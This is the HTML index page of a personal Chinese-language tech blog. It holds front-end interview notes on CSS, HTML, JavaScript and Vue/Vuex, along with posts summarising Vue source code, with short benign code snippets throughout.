<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
    
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
     Matt&#39;s Blog
  </title>
  <meta name="generator" content="hexo-theme-yilia-plus">
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/css/style.css">

  
<script src="/js/pace.min.js"></script>


  

  

<link rel="alternate" href="/atom.xml" title="Matt's Blog" type="application/atom+xml">
</head>

</html>

  <body>
    <div id="app">
      <main class="content">
        
<section class="cover">
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover2.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">Matt&#39;s Blog</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>

<div id="main">
  <section class="outer">
  <article class="articles">
    
    
    
    
    <article id="post-vue源码/2.生命周期" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
      <header class="article-header">
         
<h2 itemprop="name">
  <a class="article-title" href="/2019/12/22/vue%E6%BA%90%E7%A0%81/2.%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"
    >2.生命周期</a
  >
</h2>
  

      </header>
      

        
          <div class="article-meta">
            <a href="/2019/12/22/vue%E6%BA%90%E7%A0%81/2.%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/" class="article-date">
  <time datetime="2019-12-21T16:15:29.000Z" itemprop="datePublished">2019-12-22</time>
</a>
              
  <div class="article-category">
    <a class="article-category-link" href="/categories/Vue/">Vue</a>
  </div>

                
                  
                    
          </div>
          

            

                  <div class="article-entry" itemprop="articleBody">
                    


                      

                        
                          <ul>
<li><p>_init</p>
<ul>
<li>beforeCreate (initLifeCycle,initEvents,initRender)</li>
<li>created 可以获得data,props (initInjections,initState,initProvide)，在这里已经完成了 数据data computed的响应式处理以及 watch event的事件回调
                            
                              <a class="article-more-link" href="/2019/12/22/vue%E6%BA%90%E7%A0%81/2.%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/">
                                阅读更多...
                              </a>
                              
                                

                                      <!-- copyright -->
                                      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vue/" rel="tag">Vue</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/" rel="tag">源码解析</a></li></ul>


    </footer>

  </div>

  

  

  

</article>
    
    <article id="post-vue源码/1.数据驱动" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
      <header class="article-header">
         
<h2 itemprop="name">
  <a class="article-title" href="/2019/12/22/vue%E6%BA%90%E7%A0%81/1.%E6%95%B0%E6%8D%AE%E9%A9%B1%E5%8A%A8/"
    >1.数据驱动</a
  >
</h2>
  

      </header>
      

        
          <div class="article-meta">
            <a href="/2019/12/22/vue%E6%BA%90%E7%A0%81/1.%E6%95%B0%E6%8D%AE%E9%A9%B1%E5%8A%A8/" class="article-date">
  <time datetime="2019-12-21T16:15:28.000Z" itemprop="datePublished">2019-12-22</time>
</a>
              
  <div class="article-category">
    <a class="article-category-link" href="/categories/Vue/">Vue</a>
  </div>

                
                  
                    
          </div>
          

            

                  <div class="article-entry" itemprop="articleBody">
                    


                      

                        
                          <h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ol>
<li>初始化，在Vue原型上部署各种方法，</li>
<li><code>new Vue</code>时执行<code>Vue.prototype._init()</code><ul>
<li>initState() =&gt; initData()</li>
</ul>
</li>
<li>执行 <code>Vue.prototype.$mount</code><ul>
<li>编译生成 render 函数</li>
<li>mountComponent <ul>
<li>new Watcher =&gt; this.get =&gt; this.getter() =&gt; vm._update(vm._render(), hydrating)</li>
</ul>
</li>
<li>Vue.prototype._render()<ul>
<li>render.call(vm._renderProxy, vm.$createElement)</li>
</ul>
</li>
<li>Vue.prototype._update()<ul>
<li>patch()
                            
                              <a class="article-more-link" href="/2019/12/22/vue%E6%BA%90%E7%A0%81/1.%E6%95%B0%E6%8D%AE%E9%A9%B1%E5%8A%A8/">
                                阅读更多...
                              </a>
                              
                                

                                      <!-- copyright -->
                                      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vue/" rel="tag">Vue</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/" rel="tag">源码解析</a></li></ul>


    </footer>

  </div>

  

  

  

</article>
    
    <article id="post-interview/css" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
      <header class="article-header">
         
<h2 itemprop="name">
  <a class="article-title" href="/2019/11/23/interview/css/"
    >css题目</a
  >
</h2>
  

      </header>
      

        
          <div class="article-meta">
            <a href="/2019/11/23/interview/css/" class="article-date">
  <time datetime="2019-11-22T16:15:39.000Z" itemprop="datePublished">2019-11-23</time>
</a>
              
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E9%9D%A2%E8%AF%95/">面试</a>
  </div>

                
                  
                    
          </div>
          

            

                  <div class="article-entry" itemprop="articleBody">
                    


                      

                        
                                  <h1 id="第1天-圣杯布局和双飞翼布局的理解和区别，并用代码实现"><a href="#第1天-圣杯布局和双飞翼布局的理解和区别，并用代码实现" class="headerlink" title="第1天 圣杯布局和双飞翼布局的理解和区别，并用代码实现"></a>第1天 圣杯布局和双飞翼布局的理解和区别，并用代码实现</h1><p><a href="https://www.jianshu.com/p/81ef7e7094e8" target="_blank" rel="noopener">答案</a></p>
<h1 id="第2天-CSS3有哪些新增的特性？"><a href="#第2天-CSS3有哪些新增的特性？" class="headerlink" title="第2天 CSS3有哪些新增的特性？"></a>第2天 CSS3有哪些新增的特性？</h1><p>边框圆角<br>border-radius<br>盒子阴影<br>box-shadow<br>文字阴影<br>text-shadow<br>2d、3d变换<br>transform<br>rotate()<br>scale()<br>skew()<br>translate()<br>过度动画<br>transition<br>自定义动画<br>animation</p>
<h1 id="第3天-在页面上隐藏元素的方法有哪些？"><a href="#第3天-在页面上隐藏元素的方法有哪些？" class="headerlink" title="第3天 在页面上隐藏元素的方法有哪些？"></a>第3天 在页面上隐藏元素的方法有哪些？</h1><p>disaplay: none; 页面不会渲染<br>visibility: hidden; 页面会渲染只是不限显示<br>opacity: 0; 看不见，但是会占据空间,可以点击</p>
<h1 id="CSS选择器有哪些？哪些属性可以继承？优先级算法如何计算？内联和important哪个优先？"><a href="#CSS选择器有哪些？哪些属性可以继承？优先级算法如何计算？内联和important哪个优先？" class="headerlink" title="CSS选择器有哪些？哪些属性可以继承？优先级算法如何计算？内联和important哪个优先？"></a>CSS选择器有哪些？哪些属性可以继承？优先级算法如何计算？内联和important哪个优先？</h1><p><a href="https://blog.csdn.net/sjinsa/article/details/70768483" target="_blank" rel="noopener">答案</a></p>
<p>!important &gt; 内联样式 &gt; id &gt; class(属性选择器[]、伪类 :) &gt; 标签(伪元素) &gt; 通用选择器 &gt; 继承 &gt; 默认</p>

                                    

                                      <!-- copyright -->
                                      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/css/" rel="tag">css</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/" rel="tag">面试题</a></li></ul>


    </footer>

  </div>

  

  

  

</article>
    
    <article id="post-interview/html" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
      <header class="article-header">
         
<h2 itemprop="name">
  <a class="article-title" href="/2019/11/23/interview/html/"
    >html题目</a
  >
</h2>
  

      </header>
      

        
          <div class="article-meta">
            <a href="/2019/11/23/interview/html/" class="article-date">
  <time datetime="2019-11-22T16:15:39.000Z" itemprop="datePublished">2019-11-23</time>
</a>
              
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E9%9D%A2%E8%AF%95/">面试</a>
  </div>

                
                  
                    
          </div>
          

            

                  <div class="article-entry" itemprop="articleBody">
                    


                      

                        
                                  <h1 id="页面导入样式时，使用link和-import有什么区别？"><a href="#页面导入样式时，使用link和-import有什么区别？" class="headerlink" title="页面导入样式时，使用link和@import有什么区别？"></a>页面导入样式时，使用link和@import有什么区别？</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"****.css"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="css"><span class="keyword">@import</span> <span class="string">"***.css"</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>link是HTML标签，@import是css提供的。</li>
<li>link引入的样式页面加载时同时加载，@import引入的样式需等页面加载完成后再加载。</li>
<li>link没有兼容性问题，@import不兼容ie5以下。</li>
<li>link可以通过js操作DOM动态引入样式表改变样式，而@import不可以。</li>
</ol>
<h1 id="html的元素有哪些（包含H5）？"><a href="#html的元素有哪些（包含H5）？" class="headerlink" title="html的元素有哪些（包含H5）？"></a>html的元素有哪些（包含H5）？</h1><p>行内元素<br>a<br>b<br>span<br>i<br>em<br>strong<br>block<br>input<br>button<br>select<br>form<br>块级元素<br>div<br>p<br>ul<br>ol<br>li<br>h1~h6<br>textarea<br>H5新增<br>header<br>section<br>asize<br>footer<br>nav<br>article</p>
<h1 id="HTML5的文件离线储存怎么使用，工作原理是什么？"><a href="#HTML5的文件离线储存怎么使用，工作原理是什么？" class="headerlink" title="HTML5的文件离线储存怎么使用，工作原理是什么？"></a>HTML5的文件离线储存怎么使用，工作原理是什么？</h1><h2 id="1、cookie"><a href="#1、cookie" class="headerlink" title="1、cookie"></a>1、cookie</h2><p>（1）本身用于客户端和服务端通信<br>（2）但是它有本地存储的功能，于是就被“借用”<br>（3）document.cookie = …获取和修改即可<br>（4）cookie用于存储的缺点<br>①存储量太小，只有4kb<br>②所有http请求都带着，会影响获取资源的效率<br>③api简单，需要封装才能用document.cookie</p>
<h2 id="2、localStorage-sesseionStorage"><a href="#2、localStorage-sesseionStorage" class="headerlink" title="2、localStorage,sesseionStorage"></a>2、localStorage,sesseionStorage</h2><p>（1）html5专门为存储而设计，最大容量5M<br>（2）api简单易用<br>（3）lcoalStorage.setItem(key, value);localStorage.getItem(key);<br>（4）ios safari隐藏模式下:localStorage.getItem会报错，建议统一使用try-catch封装 </p>
<h2 id="3、sessionStorage"><a href="#3、sessionStorage" class="headerlink" title="3、sessionStorage"></a>3、sessionStorage</h2><p>用于本地存储一个会话（session）中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。因此sessionStorage不是一种持久化的本地存储，仅仅是会话级别的存储。而localStorage用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。</p>
<h2 id="LocalForage"><a href="#LocalForage" class="headerlink" title="LocalForage"></a>LocalForage</h2><p>Mozilla 开发了一个叫 localForage 的库 ，使得离线数据存储在任何浏览器都是一项容易的任务。localForage 是一个使用非常简单的 JavaScript 库的，提供了 get，set，remove，clear 和 length 等等 API，还具有以下特点：<br>支持回调的异步 API；<br>支持 IndexedDB，WebSQL 和 localStorage 三种存储模式；<br>支持 BLOB 和任意类型的数据，让您可以存储图片，文件等。<br>支持 ES6 Promises</p>
<table>
<tr>
  <th></th><th>cookie</th><th>localstorage</th><th>sessionstorage</th><th>session</th>
</tr>
<tr>
  <td></td><td colspan="4" style="text-align:center">k-v存储 同域名可用</td>
</tr>
<tr>
  <td>存储位置</td><td colspan="3" style="text-align:center">客户端</td><td style="text-align:center">服务端</td>
</tr>
<tr>
  <td>特点</td><td style="text-align:center">随请求头每次提交</td><td style="text-align:center">不随头提交 可长时保存</td><td style="text-align:center">不随头提交页面关闭即失效</td><td style="text-align:center">安全</td>
</tr>
<tr>
  <td>跨页</td><td style="text-align:center" colspan="2">可跨页，不可跨域</td><td style="text-align:center">不可跨页，不可跨域</td><td style="text-align:center">可跨页，不可跨域</td>
</tr>
</table>


<h1 id="简述超链接target属性的取值和作用"><a href="#简述超链接target属性的取值和作用" class="headerlink" title="简述超链接target属性的取值和作用"></a>简述超链接target属性的取值和作用</h1><p><code>&lt;a&gt;</code> 标签的 target 属性规定在何处打开链接文档。</p>
<p>语法：<code>&lt;a target=&quot;value&quot;&gt;</code><br>属性值：<br>|值 |描述|<br>|–|–|<br>|_blank|在新窗口中打开被链接文档。|<br>|_self|默认。在相同的框架中打开被链接文档。|<br>|_parent|在父框架集中打开被链接文档。|<br>|_top|在整个窗口中打开被链接文档。|<br>|framename|在指定的框架中打开被链接文档。|</p>

                                    

                                      <!-- copyright -->
                                      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/html/" rel="tag">html</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/" rel="tag">面试题</a></li></ul>


    </footer>

  </div>

  

  

  

</article>
    
    <article id="post-interview/js" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
      <header class="article-header">
         
<h2 itemprop="name">
  <a class="article-title" href="/2019/11/23/interview/js/"
    >javascript题目</a
  >
</h2>
  

      </header>
      

        
          <div class="article-meta">
            <a href="/2019/11/23/interview/js/" class="article-date">
  <time datetime="2019-11-22T16:15:39.000Z" itemprop="datePublished">2019-11-23</time>
</a>
              
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E9%9D%A2%E8%AF%95/">面试</a>
  </div>

                
                  
                    
          </div>
          

            

                  <div class="article-entry" itemprop="articleBody">
                    


                      

                        
                                  <h1 id="用递归算法实现，数组长度为5且元素的随机数在2-32间不重复的值"><a href="#用递归算法实现，数组长度为5且元素的随机数在2-32间不重复的值" class="headerlink" title="用递归算法实现，数组长度为5且元素的随机数在2-32间不重复的值"></a>用递归算法实现，数组长度为5且元素的随机数在2-32间不重复的值</h1><blockquote>
<p>描述：这是一道大题目，把考点拆成了4个小项；需要侯选人用递归算法实现（限制15行代码以内实现；限制时间10分钟内完成）：<br>(a) 生成一个长度为5的空数组arr。<br>(b) 生成一个（2－32）之间的随机整数rand。<br>(c) 把随机数rand插入到数组arr内，如果数组arr内已存在与rand相同的数字，则重新生成随机数rand并插入到arr内[需要使用递归实现，不能使用for/while等循环]<br>(d) 最终输出一个长度为5，且内容不重复的数组arr。</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildArray</span>(<span class="params">arr, length, min, max</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> num = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (max - min + <span class="number">1</span>)) + min;</span><br><span class="line">    <span class="keyword">if</span> (!arr.includes(num)) &#123; arr.push(num); &#125;</span><br><span class="line">    <span class="keyword">return</span> arr.length === length ? arr : buildArray(arr, length, min, max);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> result = buildArray([], <span class="number">5</span>, <span class="number">2</span>, <span class="number">32</span>);</span><br><span class="line"><span class="built_in">console</span>.table(result);</span><br></pre></td></tr></table></figure>

<h1 id="写一个方法去掉字符串中的空格"><a href="#写一个方法去掉字符串中的空格" class="headerlink" title="写一个方法去掉字符串中的空格"></a>写一个方法去掉字符串中的空格</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> trim = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> str.replace(<span class="regexp">/\s*/g</span>,<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line">str.replace(<span class="regexp">/\s*/g</span>,<span class="string">""</span>); <span class="comment">//去除字符串内所有的空格</span></span><br><span class="line">str.replace(<span class="regexp">/^\s*|\s*$/g</span>,<span class="string">""</span>); <span class="comment">//去除字符串内两头的空格</span></span><br><span class="line">str.replace(<span class="regexp">/^\s*/</span>,<span class="string">""</span>); <span class="comment">//去除字符串内左侧的空格</span></span><br><span class="line">str.replace(<span class="regexp">/(\s*$)/g</span>,<span class="string">""</span>); <span class="comment">//去除字符串内右侧的空格</span></span><br></pre></td></tr></table></figure>
<h1 id="写一个方法把下划线命名转成大驼峰命名"><a href="#写一个方法把下划线命名转成大驼峰命名" class="headerlink" title="写一个方法把下划线命名转成大驼峰命名"></a>写一个方法把下划线命名转成大驼峰命名</h1><p>function toCamelCase(str) {<br>  if (typeof str !== ‘string’) {<br>    return str;<br>  }<br>  return str<br>    .split(‘_’)<br>    .map(item =&gt; item.charAt(0).toUpperCase() + item.substr(1, item.length))<br>    .join(‘’);<br>}</p>
<h1 id="写一个把字符串大小写切换的方法"><a href="#写一个把字符串大小写切换的方法" class="headerlink" title="写一个把字符串大小写切换的方法"></a>写一个把字符串大小写切换的方法</h1><p>function caseConvertEasy(str) {<br>  return str.split(‘’).map(s =&gt; {<br>    if (s.charCodeAt() &lt;= 90) {<br>      return s.toLowerCase()<br>    }<br>    return s.toUpperCase()<br>  }).join(‘’)<br>}</p>
<h1 id="JavaScript跨域总结与解决办法"><a href="#JavaScript跨域总结与解决办法" class="headerlink" title="JavaScript跨域总结与解决办法"></a>JavaScript跨域总结与解决办法</h1><p><a href="https://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html#m3" target="_blank" rel="noopener">https://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html#m3</a></p>

                                    

                                      <!-- copyright -->
                                      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/javascript/" rel="tag">javascript</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/" rel="tag">面试题</a></li></ul>


    </footer>

  </div>

  

  

  

</article>
    
    <article id="post-interview/vue" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
      <header class="article-header">
         
<h2 itemprop="name">
  <a class="article-title" href="/2019/11/23/interview/vue/"
    >Vue题目</a
  >
</h2>
  

      </header>
      

        
          <div class="article-meta">
            <a href="/2019/11/23/interview/vue/" class="article-date">
  <time datetime="2019-11-22T16:15:39.000Z" itemprop="datePublished">2019-11-23</time>
</a>
              
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E9%9D%A2%E8%AF%95/">面试</a>
  </div>

                
                  
                    
          </div>
          

            

                  <div class="article-entry" itemprop="articleBody">
                    


                      

                        
                                  <h2 id="写-Vue-项目时为什么要在列表组件中写-key，其作用是什么？"><a href="#写-Vue-项目时为什么要在列表组件中写-key，其作用是什么？" class="headerlink" title="写 Vue 项目时为什么要在列表组件中写 key，其作用是什么？"></a>写 Vue 项目时为什么要在列表组件中写 key，其作用是什么？</h2><ul>
<li>考虑到DOM节点更改的性能问题，Vue使用vnode做虚拟dom节点进行更新</li>
<li>组件的更新，是通过每一个vue实例的watcher派发更新的，每一步更新都是更新一个vue实例对应的dom。因为update事件被推送到任务队列时，是按watcher的id从小到大进行排序，所以会先更新用户watcher，再更新父watcher，再更新子watcher</li>
<li>响应式数据的变化触发渲染watcher的updateComponment方法，执行vm._patch(vm._render,false)过程</li>
</ul>
<ol>
<li>_render() 生成当前vm实例 新的vnode</li>
<li>_update() 执行 patch方法，由于此时存在旧vnode，如果新旧vnode不同（key tag），会调用 patchVnode，如果是不同的vnode，createELm 创建新的dom，并删去旧的dom</li>
<li>patchVnode 主要是进行更新dom操作 <ul>
<li>新旧节点的孩子节点存在 且不同，调用diff算法</li>
<li>比较 新旧节点的文本，进行更新</li>
</ul>
</li>
<li>diff算法</li>
</ol>
<p>参考： <a href="https://segmentfault.com/a/1190000008782928" target="_blank" rel="noopener">https://segmentfault.com/a/1190000008782928</a></p>
<p>在diff算法中vue只对同级的vnode节点进行比较，oldCh和newCh各有两个头尾的变量StartIdx和EndIdx，它们的2个变量相互比较，一共有4种比较方式。如果4种比较都没匹配，如果设置了key，就会用key进行比较，在比较的过程中，变量会往中间靠，一旦StartIdx&gt;EndIdx表明oldCh和newCh至少有一个已经遍历完了，就会结束比较。<br>不设key，newCh和oldCh只会进行头尾两端的相互比较，设key后，除了头尾两端的比较外，还会从用key生成的对象oldKeyToIdx中查找newStartVnode.key匹配的节点(没有设置key的话需要执行findIdxInOld方法去比较newStartVnode和所有的oldCh），所以为节点设置key可以更高效的利用dom。</p>
<p>对于带状态的组件渲染，唯一的key值在每次渲染列表时都会完全替换所有组件，使其拥有正确状态（而不是就地更新）。</p>
<h1 id="Vue-的-diff-时间复杂度从-O-n-3-优化到-O-n"><a href="#Vue-的-diff-时间复杂度从-O-n-3-优化到-O-n" class="headerlink" title="Vue 的 diff 时间复杂度从 O(n^3) 优化到 O(n) ?"></a>Vue 的 diff 时间复杂度从 O(n^3) 优化到 O(n) ?</h1><ul>
<li>Vue的diff是同层级比较;</li>
<li>对于同一层级的一组子节点，通过分配唯一唯一id进行区分（key值）</li>
</ul>
<h1 id="vuex中为什么把把异步操作封装在action，把同步操作放在mutations？"><a href="#vuex中为什么把把异步操作封装在action，把同步操作放在mutations？" class="headerlink" title="vuex中为什么把把异步操作封装在action，把同步操作放在mutations？"></a>vuex中为什么把把异步操作封装在action，把同步操作放在mutations？</h1><p><a href="https://www.zhihu.com/question/48759748/answer/112823337" target="_blank" rel="noopener">参考</a><br>尤雨溪：为了能用 devtools 追踪状态变化<br>同步的意义在于这样每一个 mutation 执行完成后都可以对应到一个新的状态（和 reducer 一样），这样 devtools 就可以打个 snapshot 存下来，然后就可以随便 time-travel 了。</p>
<h1 id="双向绑定和-vuex-是否冲突？"><a href="#双向绑定和-vuex-是否冲突？" class="headerlink" title="双向绑定和 vuex 是否冲突？"></a>双向绑定和 vuex 是否冲突？</h1><p>在严格模式中使用Vuex，当用户输入时，v-model会试图直接修改属性值，但这个修改不是在mutation中修改的，所以会抛出一个错误。当需要在组件中使用vuex中的state时，有2种解决方案： 1、在input中绑定value(vuex中的state)，然后监听input的change或者input事件，在事件回调中调用mutation修改state的值 2、使用带有setter的双向绑定计算属性。见以下例子（来自官方文档）：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;input v-model=<span class="string">"message"</span>&gt; </span><br><span class="line">computed: &#123; </span><br><span class="line">    message: &#123; </span><br><span class="line">        <span class="keyword">get</span> () &#123; <span class="keyword">return</span> <span class="keyword">this</span>.$store.state.obj.message &#125;, <span class="keyword">set</span> (value) &#123; <span class="keyword">this</span>.$store.commit(<span class="string">'updateMessage'</span>, value) </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Vuex的设计思想？"><a href="#Vuex的设计思想？" class="headerlink" title="Vuex的设计思想？"></a>Vuex的设计思想？</h1><p><img src="https://pic1.zhimg.com/80/v2-1b21813cd1d621658fe7402f0af4b104_hd.jpg" alt="vuex"><br>全局的 Store，包含着应用中的状态 State,这个 State 是单一的,子组件能通过 this.$store 访问到 state 。<br>Vuex 让 View 通过某种方式触发 Store 的事件或方法，Store 的事件或方法对 State 进行修改或返回一个新的 State，State 改变之后，View 发生响应式改变。</p>
<h2 id="Vuex初始化"><a href="#Vuex初始化" class="headerlink" title="Vuex初始化"></a>Vuex初始化</h2><p>state 的是按模块划分的，按模块的嵌套形成一颗状态树。注册对子module迭代执行初始化流程（path上附加上父路径）。<br>而 actions、mutations 和 getters 的全局的，其中 actions 和 mutations 的 key 允许重复，但 getters 的 key 是不允许重复的。</p>
<h2 id="mutations-只能执行同步操作"><a href="#mutations-只能执行同步操作" class="headerlink" title="mutations 只能执行同步操作"></a>mutations 只能执行同步操作</h2><p>store.commit(‘moduleA/incrementAge’)</p>
<ol>
<li>执行 store 的 commit函数</li>
<li>通过传入的 key值 来获得对应的用户自定义的mutaitons方法 <code>store._mutaitons[key]</code></li>
<li>在 store._withCommit 方法中 执行 mutations方法，为了保证对state的直接操作不会触发警告</li>
</ol>
<h3 id="Commit"><a href="#Commit" class="headerlink" title="Commit"></a>Commit</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">commit (type, payload, options) &#123;</span><br><span class="line">  <span class="comment">// check object-style commit</span></span><br><span class="line">  <span class="keyword">if</span> (isObject(type) &amp;&amp; type.type) &#123;</span><br><span class="line">    options = payload</span><br><span class="line">    payload = type</span><br><span class="line">    type = type.type</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> mutation = &#123; type, payload &#125;</span><br><span class="line">  <span class="keyword">const</span> entry = <span class="keyword">this</span>._mutations[type]</span><br><span class="line">  <span class="keyword">if</span> (!entry) &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(<span class="string">`[vuex] unknown mutation type: <span class="subst">$&#123;type&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>._withCommit(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    entry.forEach(<span class="function"><span class="keyword">function</span> <span class="title">commitIterator</span> (<span class="params">handler</span>) </span>&#123;</span><br><span class="line">      handler(payload)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> (!options || !options.silent) &#123;</span><br><span class="line">    <span class="keyword">this</span>._subscribers.forEach(<span class="function"><span class="params">sub</span> =&gt;</span> sub(mutation, <span class="keyword">this</span>.state))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> subscribe 订阅（注册监听）store 的 mutation，调用这个返回的函数，就可以解除当前函数对 store 的 mutation 的监听</p>
<h2 id="actions-可以异步操作"><a href="#actions-可以异步操作" class="headerlink" title="actions 可以异步操作"></a>actions 可以异步操作</h2><ol>
<li>dispatch根据传入的 key 值 获得 用户自定义的 actions</li>
<li>执行<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> entry = <span class="keyword">this</span>._actions[type]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> result = entry.length &gt; <span class="number">1</span></span><br><span class="line">      ? <span class="built_in">Promise</span>.all(entry.map(<span class="function"><span class="params">handler</span> =&gt;</span> handler(payload)))</span><br><span class="line">      : entry[<span class="number">0</span>](payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result.then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>._actionSubscribers</span><br><span class="line">          .filter(<span class="function"><span class="params">sub</span> =&gt;</span> sub.after)</span><br><span class="line">          .forEach(<span class="function"><span class="params">sub</span> =&gt;</span> sub.after(action, <span class="keyword">this</span>.state))</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (process.env.NODE_ENV !== <span class="string">'production'</span>) &#123;</span><br><span class="line">          <span class="built_in">console</span>.warn(<span class="string">`[vuex] error in after action subscribers: `</span>)</span><br><span class="line">          <span class="built_in">console</span>.error(e)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> res</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
